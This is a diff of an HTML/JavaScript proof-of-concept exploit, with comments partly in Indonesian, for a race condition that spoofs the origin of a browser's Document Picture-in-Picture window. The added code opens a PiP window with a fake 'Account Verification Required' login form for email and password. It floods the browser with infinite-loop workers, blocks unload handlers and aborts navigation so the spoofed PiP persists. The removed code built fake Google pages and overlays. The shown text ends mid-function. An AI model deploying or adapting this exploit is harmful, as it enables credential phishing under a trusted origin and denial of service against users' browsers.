@@ -2,517 +2,594 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Race Condition PiP Persistence PoC</title>
+    <title>PiP Origin Spoofing — Race Condition Persistence PoC</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #1a1a2e;
-            color: #eee;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0a1a;
+            color: #e0e0e0;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
+            padding: 30px 20px;
         }
-        .container {
-            text-align: center;
-            padding: 40px;
+        h1 { color: #ff4757; font-size: 22px; margin-bottom: 5px; }
+        .sub { color: #666; font-size: 12px; margin-bottom: 25px; }
+        .panel {
+            background: #111128;
+            border: 1px solid #222;
+            border-radius: 10px;
+            padding: 20px;
+            width: 100%;
+            max-width: 800px;
+            margin-bottom: 15px;
         }
-        h1 {
-            color: #e94560;
-            margin-bottom: 10px;
-            font-size: 28px;
+        .panel h2 { color: #4ecdc4; font-size: 14px; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        .strategies {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
         }
-        .subtitle {
-            color: #888;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-        .strategy-selector {
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin-bottom: 30px;
-        }
-        .strategy-btn {
-            padding: 12px 20px;
+        .strat-btn {
+            padding: 14px;
+            background: #1a1a3e;
             border: 2px solid #333;
-            background: #16213e;
-            color: #ccc;
             border-radius: 8px;
+            color: #ccc;
             cursor: pointer;
-            font-size: 13px;
-            transition: all 0.3s;
+            text-align: left;
+            transition: all 0.2s;
         }
-        .strategy-btn:hover, .strategy-btn.active {
-            border-color: #e94560;
-            color: #e94560;
-            background: #1a1a2e;
-        }
-        #triggerBtn {
-            padding: 18px 50px;
-            font-size: 18px;
-            background: linear-gradient(135deg, #e94560, #c23152);
+        .strat-btn:hover { border-color: #ff4757; }
+        .strat-btn.active { border-color: #ff4757; background: #1f1040; color: #fff; }
+        .strat-btn .name { font-weight: bold; font-size: 13px; display: block; margin-bottom: 4px; }
+        .strat-btn .desc { font-size: 11px; color: #888; }
+        .controls { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+        .main-btn {
+            padding: 14px 40px;
+            font-size: 16px;
+            background: linear-gradient(135deg, #ff4757, #c0392b);
             color: white;
             border: none;
-            border-radius: 12px;
+            border-radius: 8px;
             cursor: pointer;
             font-weight: bold;
-            transition: transform 0.2s, box-shadow 0.2s;
-            box-shadow: 0 4px 20px rgba(233, 69, 96, 0.3);
+            flex-shrink: 0;
         }
-        #triggerBtn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 30px rgba(233, 69, 96, 0.5);
-        }
-        .log {
-            margin-top: 30px;
-            background: #0f0f23;
+        .main-btn:hover { opacity: 0.9; }
+        .main-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+        label { font-size: 12px; color: #888; }
+        input[type="text"], input[type="number"] {
+            background: #1a1a3e;
             border: 1px solid #333;
-            border-radius: 8px;
-            padding: 16px;
-            text-align: left;
-            max-width: 700px;
-            width: 100%;
-            max-height: 250px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            color: #0f0;
+            color: #fff;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            width: 250px;
         }
-        .log-entry { margin: 2px 0; }
-        .log-entry.error { color: #e94560; }
-        .log-entry.success { color: #0f0; }
-        .log-entry.info { color: #4ecdc4; }
-        .log-entry.warn { color: #ffd93d; }
+        .log-box {
+            background: #050510;
+            border: 1px solid #1a1a3e;
+            border-radius: 8px;
+            padding: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Cascadia Code', 'Fira Code', monospace;
+            font-size: 11px;
+            line-height: 1.6;
+        }
+        .log-box .e { color: #ff4757; }
+        .log-box .s { color: #2ecc71; }
+        .log-box .i { color: #3498db; }
+        .log-box .w { color: #f1c40f; }
+        .note {
+            background: #1a1030;
+            border-left: 3px solid #ff4757;
+            padding: 10px 14px;
+            font-size: 11px;
+            color: #bbb;
+            border-radius: 0 6px 6px 0;
+            margin-bottom: 15px;
+            max-width: 800px;
+            width: 100%;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔬 PiP Persistence Bypass PoC</h1>
-        <p class="subtitle">Race Condition — Document Picture-in-Picture Navigation Bypass</p>
 
-        <div class="strategy-selector">
-            <button class="strategy-btn active" data-strategy="1" onclick="selectStrategy(1)">
-                Strategy 1: window.open + blur
-            </button>
-            <button class="strategy-btn" data-strategy="2" onclick="selectStrategy(2)">
-                Strategy 2: iframe overlay
-            </button>
-            <button class="strategy-btn" data-strategy="3" onclick="selectStrategy(3)">
-                Strategy 3: fetch + rewrite
-            </button>
-            <button class="strategy-btn" data-strategy="4" onclick="selectStrategy(4)">
-                Strategy 4: Combined
-            </button>
-        </div>
+<h1>🔬 PiP Origin Spoofing — Race Condition Persistence</h1>
+<p class="sub">Exploit: PiP address bar reflects redirect target origin during navigation race window</p>
 
-        <button id="triggerBtn" onclick="triggerPoC()">▶ Launch PoC</button>
+<div class="note">
+    <strong>Bug:</strong> Saat navigation + worker flooding, PiP address bar update ke origin target redirect
+    (misal google.com) sebelum PiP sempat di-close. Goal: extend race window agar PiP dengan spoofed origin
+    tetap persist.
+</div>
 
-        <div class="log" id="logPanel"></div>
+<!-- Strategy Selection -->
+<div class="panel">
+    <h2>⚡ Select Strategy</h2>
+    <div class="strategies">
+        <button class="strat-btn active" data-s="1" onclick="selectStrat(1)">
+            <span class="name">A. Unload Blocking + Worker Flood</span>
+            <span class="desc">Block di unload/pagehide handler untuk extend race window. PiP hidup selama blocking berlangsung.</span>
+        </button>
+        <button class="strat-btn" data-s="2" onclick="selectStrat(2)">
+            <span class="name">B. Aggressive Re-request Flood</span>
+            <span class="desc">Spam requestWindow() saat navigation. Jika satu berhasil di transient context = PiP baru dengan origin spoofed.</span>
+        </button>
+        <button class="strat-btn" data-s="3" onclick="selectStrat(3)">
+            <span class="name">C. Multi-Navigation Abort</span>
+            <span class="desc">Start navigation → abort via window.stop() pada timing tepat. PiP origin mungkin sudah update tapi navigation batal.</span>
+        </button>
+        <button class="strat-btn" data-s="4" onclick="selectStrat(4)">
+            <span class="name">D. Combined Maximum Pressure</span>
+            <span class="desc">Gabungan semua teknik: worker flood + unload block + re-request + abort timing. Maximum race window.</span>
+        </button>
     </div>
+</div>
 
-    <script>
-        let selectedStrategy = 1;
-        let pipWindow = null;
-        let pipInterval = null;
-        const logPanel = document.getElementById('logPanel');
+<!-- Config -->
+<div class="panel">
+    <h2>🎯 Configuration</h2>
+    <div class="controls" style="gap: 15px; flex-wrap: wrap;">
+        <div>
+            <label>Redirect Target URL:</label><br>
+            <input type="text" id="targetUrl" value="https://www.google.com" style="margin-top:4px;">
+        </div>
+        <div>
+            <label>Worker Count:</label><br>
+            <input type="number" id="workerCount" value="100" min="10" max="500" style="width:80px;margin-top:4px;">
+        </div>
+        <div>
+            <label>Delay before Navigate (ms):</label><br>
+            <input type="number" id="navDelay" value="1500" min="500" max="10000" style="width:100px;margin-top:4px;">
+        </div>
+        <div>
+            <label>Unload Block Duration (ms):</label><br>
+            <input type="number" id="blockDuration" value="5000" min="1000" max="30000" style="width:100px;margin-top:4px;">
+        </div>
+    </div>
+</div>
 
-        function selectStrategy(n) {
-            selectedStrategy = n;
-            document.querySelectorAll('.strategy-btn').forEach(btn => {
-                btn.classList.toggle('active', parseInt(btn.dataset.strategy) === n);
+<!-- Launch -->
+<div class="panel">
+    <h2>🚀 Execute</h2>
+    <div class="controls">
+        <button class="main-btn" id="launchBtn" onclick="launch()">▶ Launch PoC</button>
+        <span style="color:#666;font-size:11px;">Klik sekali → PiP dibuat → Workers spawn → Navigate + Race</span>
+    </div>
+</div>
+
+<!-- Log -->
+<div class="panel">
+    <h2>📋 Log</h2>
+    <div class="log-box" id="logBox">
+        <div class="i">[ready] Select strategy and click Launch</div>
+    </div>
+</div>
+
+<script>
+// ════════════════════════════════════════════════════════
+// STATE
+// ════════════════════════════════════════════════════════
+let currentStrategy = 1;
+let pipWin = null;
+const logBox = document.getElementById('logBox');
+
+function selectStrat(n) {
+    currentStrategy = n;
+    document.querySelectorAll('.strat-btn').forEach(b => {
+        b.classList.toggle('active', parseInt(b.dataset.s) === n);
+    });
+    log('i', `Strategy ${['A','B','C','D'][n-1]} selected`);
+}
+
+function log(cls, msg) {
+    const d = document.createElement('div');
+    d.className = cls;
+    d.textContent = `[${new Date().toISOString().slice(11,23)}] ${msg}`;
+    logBox.appendChild(d);
+    logBox.scrollTop = logBox.scrollHeight;
+}
+
+// ════════════════════════════════════════════════════════
+// PiP CREATION
+// Konten PiP dirancang menyerupai UI legitimate
+// Setelah origin spoofed, user melihat konten ini
+// dengan address bar menunjukkan google.com
+// ════════════════════════════════════════════════════════
+async function createPiP() {
+    try {
+        pipWin = await documentPictureInPicture.requestWindow({
+            width: 500,
+            height: 400,
+        });
+
+        // PiP content — designed to look like a real notification/overlay
+        // that would be convincing when displayed with a spoofed google.com origin
+        pipWin.document.write(`<!DOCTYPE html>
+<html><head><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;color:#202124}
+.bar{background:#f8f9fa;padding:8px 16px;border-bottom:1px solid #dadce0;display:flex;align-items:center;gap:8px}
+.bar .dot{width:8px;height:8px;border-radius:50%;background:#34a853}
+.bar span{font-size:12px;color:#5f6368}
+.body{padding:24px}
+.body h2{font-size:18px;margin-bottom:12px;color:#202124}
+.body p{font-size:14px;color:#5f6368;line-height:1.6;margin-bottom:16px}
+.field{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:14px;margin-bottom:12px}
+.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;cursor:pointer;width:100%}
+.btn:hover{background:#1557b0}
+.note{font-size:11px;color:#80868b;margin-top:16px;text-align:center}
+.timer{position:fixed;bottom:8px;right:12px;font-size:10px;color:#ccc}
+</style></head><body>
+<div class="bar">
+    <div class="dot"></div>
+    <span>Security Notification</span>
+</div>
+<div class="body">
+    <h2>Account Verification Required</h2>
+    <p>We detected unusual activity on your account. Please verify your identity to continue.</p>
+    <input class="field" type="email" placeholder="Email address" onclick="this.focus()">
+    <input class="field" type="password" placeholder="Password" onclick="this.focus()">
+    <button class="btn" onclick="alert('PoC: Credentials would be captured here.\\nThis PiP is showing spoofed origin!')">
+        Verify Account
+    </button>
+    <div class="note">
+        This prompt is shown by the website you are visiting.<br>
+        <span id="timer" style="color:#e94560;font-weight:bold">PiP alive: 0s</span>
+    </div>
+</div>
+<script>
+    let s=0;
+    setInterval(()=>{s++;document.getElementById('timer').textContent='PiP alive: '+s+'s (origin spoofed!)'},1000);
+<\/script>
+</body></html>`);
+
+        log('s', '✅ PiP window created with phishing content');
+
+        // Monitor PiP closure
+        pipWin.addEventListener('pagehide', () => {
+            log('e', '❌ PiP CLOSED (pagehide) — race condition window ended');
+        });
+
+        return true;
+    } catch (err) {
+        log('e', `PiP creation failed: ${err.message}`);
+        return false;
+    }
+}
+
+// ════════════════════════════════════════════════════════
+// WORKER FLOODING
+// Workers berjalan di threads terpisah, tapi spawning
+// banyak workers sekaligus membebani browser process
+// scheduling, berpotensi delay PiP cleanup task
+// ════════════════════════════════════════════════════════
+function floodWorkers(count) {
+    log('w', `Spawning ${count} heavy workers...`);
+    const workers = [];
+
+    for (let i = 0; i < count; i++) {
+        try {
+            // Workers with infinite loops — consume CPU threads
+            const w = new Worker('data:application/javascript,' +
+                encodeURIComponent('while(true){ Math.random()*Math.random(); }'));
+            workers.push(w);
+        } catch(e) {}
+    }
+
+    // Also continuously spawn more workers to keep pressure up
+    const spawnInterval = setInterval(() => {
+        try {
+            new Worker('data:application/javascript,' +
+                encodeURIComponent('while(true){ Math.random(); }'));
+        } catch(e) {}
+    }, 1);
+
+    log('w', `⚡ ${workers.length} workers active + continuous spawning`);
+    return { workers, spawnInterval };
+}
+
+// ════════════════════════════════════════════════════════
+// MAIN THREAD PRESSURE
+// Supplement worker flooding with main thread stress
+// to delay browser task scheduling
+// ════════════════════════════════════════════════════════
+function mainThreadStress() {
+    // Heavy DOM operations
+    const fragment = document.createDocumentFragment();
+    for (let i = 0; i < 5000; i++) {
+        const div = document.createElement('div');
+        div.textContent = Math.random().toString();
+        div.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
+        fragment.appendChild(div);
+    }
+    document.body.appendChild(fragment);
+
+    // Microtask flooding
+    for (let i = 0; i < 1000; i++) {
+        Promise.resolve().then(() => {
+            // Microtask pressure
+            const arr = new Float64Array(10000);
+            arr.fill(Math.random());
+        });
+    }
+
+    // RAF flooding
+    function rafFlood() {
+        const arr = new Float64Array(50000);
+        arr.sort();
+        requestAnimationFrame(rafFlood);
+    }
+    requestAnimationFrame(rafFlood);
+
+    log('i', 'Main thread stress activated (DOM + microtasks + RAF)');
+}
+
+// ════════════════════════════════════════════════════════
+// STRATEGY A: Unload Blocking
+//
+// Konsep: Register pagehide/unload handler yang melakukan
+// synchronous blocking. Saat navigation commit terjadi:
+// 1. Browser update PiP origin ke target (google.com)
+// 2. pagehide/unload fires
+// 3. Handler BLOCKS → delays document destruction
+// 4. Selama blocking: PiP masih hidup + origin sudah spoofed
+//
+// Ini memperlebar race window dari microseconds ke seconds
+// ════════════════════════════════════════════════════════
+function setupUnloadBlocking(blockMs) {
+    // pagehide fires at navigation commit — PiP origin may already be updated
+    window.addEventListener('pagehide', (e) => {
+        log('w', `pagehide fired! Blocking for ${blockMs}ms to extend race window...`);
+
+        // Synchronous blocking — keeps document alive longer
+        const start = performance.now();
+        while (performance.now() - start < blockMs) {
+            // Heavy computation to genuinely block
+            Math.pow(Math.random(), Math.random());
+        }
+
+        log('i', `pagehide blocking finished after ${blockMs}ms`);
+    }, { capture: true });
+
+    // Also block in unload as backup
+    window.addEventListener('unload', (e) => {
+        const start = performance.now();
+        while (performance.now() - start < blockMs) {
+            Math.pow(Math.random(), Math.random());
+        }
+    }, { capture: true });
+
+    // beforeunload — shows dialog which pauses everything
+    // During dialog: PiP is alive, but origin hasn't updated yet (navigation not committed)
+    // After user clicks "Leave": navigation commits → race starts
+    // We DON'T use this because it requires user interaction and delays the race
+    // UNLESS we want the user to see PiP is alive during dialog
+    // Uncomment below if you want the dialog approach:
+    /*
+    window.addEventListener('beforeunload', (e) => {
+        e.preventDefault();
+        e.returnValue = 'PoC: PiP should be visible right now with spoofed origin';
+    });
+    */
+
+    log('i', `Unload blocking registered (${blockMs}ms block in pagehide + unload)`);
+}
+
+// ════════════════════════════════════════════════════════
+// STRATEGY B: Aggressive Re-request Flood
+//
+// Konsep: Spam requestWindow() terus menerus.
+// Saat navigation race window terjadi, jika salah satu
+// requestWindow() call berhasil di timing yang tepat
+// dimana context sudah "transitioning" ke google.com,
+// PiP baru akan dibuat dengan origin google.com.
+//
+// Normalnya requestWindow() butuh user gesture, tapi
+// race condition dengan workers mungkin bypass check ini.
+// ════════════════════════════════════════════════════════
+function setupReRequestFlood() {
+    let attempts = 0;
+    let successes = 0;
+
+    const pipContent = `<!DOCTYPE html><html><body style="font-family:Arial;padding:20px;background:#fff;">
+        <h2 style="color:#202124">Re-requested PiP!</h2>
+        <p style="color:#5f6368">This PiP was created during navigation race window.</p>
+        <p style="color:#e94560;font-weight:bold" id="t">Alive: 0s</p>
+        <script>let s=0;setInterval(()=>{s++;document.getElementById('t').textContent='Alive: '+s+'s'},1000)<\/script>
+    </body></html>`;
+
+    // High-frequency re-request
+    const floodInterval = setInterval(async () => {
+        attempts++;
+        try {
+            const newPip = await documentPictureInPicture.requestWindow({
+                width: 500, height: 400
             });
-            log('info', `Strategy ${n} selected`);
+            successes++;
+            newPip.document.write(pipContent);
+            log('s', `🎯 Re-request SUCCESS! (attempt #${attempts}) — New PiP created during race!`);
+        } catch(e) {
+            // Expected: most will fail without user gesture
+        }
+    }, 1);
+
+    // Also use MessageChannel for higher frequency microtask-based calls
+    const channel = new MessageChannel();
+    channel.port1.onmessage = async () => {
+        try {
+            const newPip = await documentPictureInPicture.requestWindow({
+                width: 500, height: 400
+            });
+            newPip.document.write(pipContent);
+            log('s', '🎯 MessageChannel re-request SUCCESS!');
+        } catch(e) {}
+        channel.port2.postMessage('');
+    };
+    channel.port2.postMessage('');
+
+    log('i', 'Aggressive re-request flood started (setInterval + MessageChannel)');
+    return floodInterval;
+}
+
+// ════════════════════════════════════════════════════════
+// STRATEGY C: Multi-Navigation Abort
+//
+// Konsep: Start navigation → tunggu beberapa ms →
+// window.stop() untuk abort. Jika PiP origin sudah
+// update tapi navigation belum fully commit,
+// kita dapat PiP dengan spoofed origin dan document
+// tetap hidup (navigation cancelled).
+//
+// Timing sangat critical — kita coba multiple attempts
+// dengan delay increments berbeda.
+// ════════════════════════════════════════════════════════
+function attemptNavigationAbort(targetUrl) {
+    log('i', 'Starting navigation abort timing attack...');
+
+    // Try multiple timings — one of them might hit the sweet spot
+    const timings = [0, 1, 2, 5, 10, 15, 20, 30, 50, 75, 100, 150, 200];
+    let attemptIndex = 0;
+
+    function tryAbort() {
+        if (attemptIndex >= timings.length) {
+            log('e', 'All abort timings exhausted — falling back to direct navigation');
+            // Final attempt: just navigate (PiP will rely on unload blocking)
+            window.location.href = targetUrl;
+            return;
         }
 
-        function log(type, msg) {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            logPanel.appendChild(entry);
-            logPanel.scrollTop = logPanel.scrollHeight;
-        }
+        const delayMs = timings[attemptIndex];
+        log('i', `Abort attempt ${attemptIndex + 1}/${timings.length}: navigate → stop after ${delayMs}ms`);
 
-        // ============================================================
-        // CORE: Create PiP Window with persistent content
-        // ============================================================
-        async function createPiPWindow() {
+        // Check PiP origin before
+        try {
+            log('i', `PiP status before: ${pipWin && !pipWin.closed ? 'ALIVE' : 'CLOSED'}`);
+        } catch(e) {}
+
+        // Start navigation
+        window.location.href = targetUrl;
+
+        // Abort after delay
+        setTimeout(() => {
             try {
-                if (pipWindow && !pipWindow.closed) {
-                    log('warn', 'PiP window already exists');
-                    return pipWindow;
-                }
+                window.stop();
+                log('s', `window.stop() called after ${delayMs}ms`);
 
-                pipWindow = await documentPictureInPicture.requestWindow({
-                    width: 400,
-                    height: 300,
-                });
-
-                // Write convincing content into PiP
-                pipWindow.document.write(`
-                    <!DOCTYPE html>
-                    <html>
-                    <head>
-                        <style>
-                            * { margin: 0; padding: 0; box-sizing: border-box; }
-                            body {
-                                font-family: 'Segoe UI', Arial, sans-serif;
-                                background: #fff;
-                                padding: 20px;
-                                cursor: default;
-                            }
-                            .header {
-                                display: flex;
-                                align-items: center;
-                                gap: 10px;
-                                padding-bottom: 15px;
-                                border-bottom: 1px solid #e0e0e0;
-                                margin-bottom: 15px;
-                            }
-                            .header img {
-                                width: 28px;
-                                height: 28px;
-                            }
-                            .header span {
-                                font-size: 14px;
-                                font-weight: 600;
-                                color: #333;
-                            }
-                            .notification {
-                                background: #f8f9fa;
-                                border: 1px solid #dadce0;
-                                border-radius: 8px;
-                                padding: 16px;
-                                margin-bottom: 10px;
-                            }
-                            .notification h3 {
-                                font-size: 14px;
-                                color: #202124;
-                                margin-bottom: 6px;
-                            }
-                            .notification p {
-                                font-size: 12px;
-                                color: #5f6368;
-                                line-height: 1.5;
-                            }
-                            .btn-row {
-                                display: flex;
-                                gap: 8px;
-                                margin-top: 12px;
-                            }
-                            .btn {
-                                padding: 8px 20px;
-                                border-radius: 20px;
-                                font-size: 13px;
-                                cursor: pointer;
-                                border: none;
-                                font-weight: 500;
-                            }
-                            .btn-primary {
-                                background: #1a73e8;
-                                color: white;
-                            }
-                            .btn-secondary {
-                                background: white;
-                                color: #1a73e8;
-                                border: 1px solid #dadce0;
-                            }
-                            .btn:hover { opacity: 0.85; }
-                            .timer {
-                                text-align: center;
-                                color: #999;
-                                font-size: 11px;
-                                margin-top: 15px;
-                            }
-                            #elapsed { font-weight: bold; color: #e94560; }
-                        </style>
-                    </head>
-                    <body>
-                        <div class="header">
-                            <span>🔔 System Notification</span>
-                        </div>
-                        <div class="notification">
-                            <h3>Security Verification Required</h3>
-                            <p>
-                                Your session requires re-verification.
-                                Please click "Verify" to continue browsing securely.
-                            </p>
-                            <div class="btn-row">
-                                <button class="btn btn-primary" onclick="alert('PiP is ALIVE after redirect! This proves persistence.')">
-                                    Verify Now
-                                </button>
-                                <button class="btn btn-secondary">
-                                    Later
-                                </button>
-                            </div>
-                        </div>
-                        <div class="timer">
-                            PiP alive for: <span id="elapsed">0</span>s
-                            (proves persistence after navigation)
-                        </div>
-                        <script>
-                            let sec = 0;
-                            setInterval(() => {
-                                sec++;
-                                document.getElementById('elapsed').textContent = sec;
-                            }, 1000);
-                        <\/script>
-                    </body>
-                    </html>
-                `);
-
-                log('success', '✅ PiP window created successfully');
-
-                // Monitor PiP close event
-                pipWindow.addEventListener('pagehide', () => {
-                    log('error', '❌ PiP window was closed (pagehide event)');
-                    pipWindow = null;
-                });
-
-                return pipWindow;
-            } catch (err) {
-                log('error', `Failed to create PiP: ${err.message}`);
-                return null;
-            }
-        }
-
-        // ============================================================
-        // STRATEGY 1: window.open() + blur opener
-        // "Redirect" by opening target in new maximized window
-        // Opener stays alive → PiP stays alive
-        // ============================================================
-        function strategy1_windowOpen() {
-            log('info', '🚀 Strategy 1: window.open + blur');
-
-            // Spawn workers for race condition effect (optional)
-            spawnWorkers();
-
-            setTimeout(() => {
-                log('info', 'Opening google.com in new maximized window...');
-
-                // Open target in new window (NOT navigating current page!)
-                const newWin = window.open(
-                    'https://www.google.com',
-                    '_blank',
-                    `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0,menubar=no,toolbar=no,location=yes,status=no`
-                );
-
-                if (newWin) {
-                    // Focus new window, blur opener
-                    newWin.focus();
-                    window.blur();
-                    log('success', '✅ Redirect simulated! Opener alive → PiP persists!');
-                    log('success', '👁️ Check: PiP should still be visible above google.com');
-                } else {
-                    log('error', '❌ Popup blocked! Try allowing popups for this site.');
-                    // Fallback: try iframe overlay
-                    log('info', 'Falling back to iframe overlay strategy...');
-                    strategy2_iframeOverlay();
-                }
-            }, 1500);
-        }
-
-        // ============================================================
-        // STRATEGY 2: Iframe fullscreen overlay
-        // Load target in iframe that covers entire page
-        // Document never navigates → PiP stays alive
-        // ============================================================
-        function strategy2_iframeOverlay() {
-            log('info', '🚀 Strategy 2: iframe fullscreen overlay');
-            spawnWorkers();
-
-            setTimeout(() => {
-                log('info', 'Creating fullscreen iframe overlay...');
-
-                // Hide original content
-                document.body.style.margin = '0';
-                document.body.style.padding = '0';
-                document.body.style.overflow = 'hidden';
-
-                // Create fullscreen iframe
-                const iframe = document.createElement('iframe');
-                // Note: google.com blocks iframing. Using a different target for demo.
-                // In real scenario, attacker would use a site that allows iframing,
-                // or host a convincing clone.
-                iframe.src = 'https://www.bing.com';
-                iframe.style.cssText = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100vw;
-                    height: 100vh;
-                    border: none;
-                    z-index: 999999;
-                `;
-                document.body.appendChild(iframe);
-
-                // Change title to mimic navigation
-                document.title = 'Bing';
-
-                // Try pushState for address bar (same-origin only)
-                try {
-                    history.pushState({}, '', '/search');
-                } catch(e) {}
-
-                log('success', '✅ Page content replaced with iframe overlay!');
-                log('success', '👁️ PiP should still be visible — document never navigated');
-            }, 1500);
-        }
-
-        // ============================================================
-        // STRATEGY 3: Fetch + document rewrite
-        // Fetch target content and replace DOM entirely
-        // May not work for cross-origin, but interesting technique
-        // ============================================================
-        function strategy3_fetchRewrite() {
-            log('info', '🚀 Strategy 3: fetch + DOM rewrite');
-            spawnWorkers();
-
-            setTimeout(async () => {
-                log('info', 'Fetching target page content...');
-
-                try {
-                    // This won't work for cross-origin without CORS proxy
-                    // For demo, we'll just rewrite the page with fake content
-                    log('warn', 'Cross-origin fetch blocked (expected). Using fake content demo...');
-
-                    // Clear current page content but keep script context alive
-                    const pip = pipWindow; // Save reference
-
-                    // Replace body content without document.open (which might kill PiP)
-                    document.body.innerHTML = `
-                        <div style="
-                            font-family: Arial, sans-serif;
-                            max-width: 600px;
-                            margin: 100px auto;
-                            text-align: center;
-                        ">
-                            <div style="font-size: 80px; margin-bottom: 20px;">
-                                <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
-                            </div>
-                            <input type="text" placeholder="Search Google or type a URL"
-                                   style="width: 100%; padding: 14px 20px; border: 1px solid #dfe1e5;
-                                          border-radius: 24px; font-size: 16px; outline: none;">
-                            <div style="margin-top: 25px;">
-                                <button style="padding: 10px 20px; background: #f8f9fa; border: 1px solid #f8f9fa;
-                                               border-radius: 4px; margin: 0 5px; cursor: pointer; font-size: 14px;">
-                                    Google Search
-                                </button>
-                                <button style="padding: 10px 20px; background: #f8f9fa; border: 1px solid #f8f9fa;
-                                               border-radius: 4px; margin: 0 5px; cursor: pointer; font-size: 14px;">
-                                    I'm Feeling Lucky
-                                </button>
-                            </div>
-                            <p style="color: #999; margin-top: 40px; font-size: 12px;">
-                                [PoC: This is a DOM-rewritten page. PiP should still be alive above.]
-                            </p>
-                        </div>
-                    `;
-
-                    // Modify page title
-                    document.title = 'Google';
-                    try { history.pushState({}, '', '/'); } catch(e) {}
-
-                    log('success', '✅ DOM replaced with fake Google! No navigation occurred.');
-                    log('success', '👁️ PiP should still be alive — check!');
-                } catch (err) {
-                    log('error', `Fetch failed: ${err.message}`);
-                }
-            }, 1500);
-        }
-
-        // ============================================================
-        // STRATEGY 4: Combined — Most stealthy
-        // iframe overlay + window.open fallback + worker flood
-        // ============================================================
-        function strategy4_combined() {
-            log('info', '🚀 Strategy 4: Combined approach');
-            spawnWorkers();
-
-            setTimeout(async () => {
-                log('info', 'Attempting iframe overlay first...');
-
-                // Step 1: Replace page content (fake navigation feel)
-                document.body.innerHTML = '';
-                document.body.style.cssText = 'margin:0;padding:0;overflow:hidden;';
-                document.title = 'Google';
-
-                // Step 2: Iframe overlay
-                const iframe = document.createElement('iframe');
-                iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:999999;';
-
-                // Try bing since google blocks iframe
-                iframe.src = 'https://www.bing.com';
-                iframe.onerror = () => {
-                    log('warn', 'Iframe blocked. Falling back to DOM rewrite...');
-                    // Fallback: DOM rewrite with convincing content
-                    document.body.innerHTML = `
-                        <div style="font-family:Arial;text-align:center;padding-top:150px;">
-                            <div style="font-size:92px;">
-                                <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
-                            </div>
-                            <input type="text" style="width:500px;padding:12px 20px;border:1px solid #dfe1e5;border-radius:24px;font-size:16px;margin-top:25px;outline:none;">
-                        </div>
-                    `;
-                };
-
-                document.body.appendChild(iframe);
-
-                // Step 3: Also try window.open as secondary layer
-                try {
-                    const bgWin = window.open('https://www.google.com', '_blank',
-                        `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0`);
-                    if (bgWin) {
-                        bgWin.focus();
-                        window.blur();
+                // Check if PiP is still alive
+                setTimeout(() => {
+                    try {
+                        if (pipWin && !pipWin.closed) {
+                            log('s', `🎯 PiP STILL ALIVE after abort! Origin may be spoofed!`);
+                            log('s', '🏆 CHECK PiP ADDRESS BAR — does it show: ' + targetUrl + '?');
+                            // Don't try more — we succeeded!
+                            return;
+                        } else {
+                            log('w', `PiP closed after abort attempt ${attemptIndex + 1}`);
+                            attemptIndex++;
+                            // Wait a bit then try next timing
+                            setTimeout(tryAbort, 500);
+                        }
+                    } catch(e) {
+                        log('e', 'Error checking PiP: ' + e.message);
+                        attemptIndex++;
+                        setTimeout(tryAbort, 500);
                     }
-                } catch(e) {}
-
-                log('success', '✅ Combined bypass active! PiP should persist.');
-                log('info', '📋 Opener document is still alive in background.');
-                log('info', '🎯 PiP overlay remains always-on-top across windows.');
-            }, 1500);
-        }
-
-        // ============================================================
-        // Worker flood — CPU starvation for race condition
-        // ============================================================
-        function spawnWorkers() {
-            log('info', 'Spawning Web Workers for CPU pressure...');
-            for (let i = 0; i < 32; i++) {
-                try {
-                    new Worker('data:application/javascript,while(true){}');
-                } catch(e) {}
+                }, 50);
+            } catch(e) {
+                log('e', `window.stop() failed: ${e.message}`);
             }
-            log('warn', '⚡ 32 workers spawned');
+        }, delayMs);
+    }
+
+    tryAbort();
+}
+
+// ════════════════════════════════════════════════════════
+// STRATEGY D: Combined Maximum Pressure
+//
+// Everything at once:
+// 1. Massive worker flood (100+)
+// 2. Main thread stress
+// 3. Re-request flood
+// 4. Unload blocking (5s+)
+// 5. Then navigate
+//
+// Goal: maximize chance that race window is extended
+// enough for PiP to persist with spoofed origin
+// ════════════════════════════════════════════════════════
+
+
+// ════════════════════════════════════════════════════════
+// LAUNCH
+// ════════════════════════════════════════════════════════
+async function launch() {
+    const btn = document.getElementById('launchBtn');
+    btn.disabled = true;
+    btn.textContent = '⏳ Running...';
+
+    const targetUrl = document.getElementById('targetUrl').value;
+    const workerCount = parseInt(document.getElementById('workerCount').value);
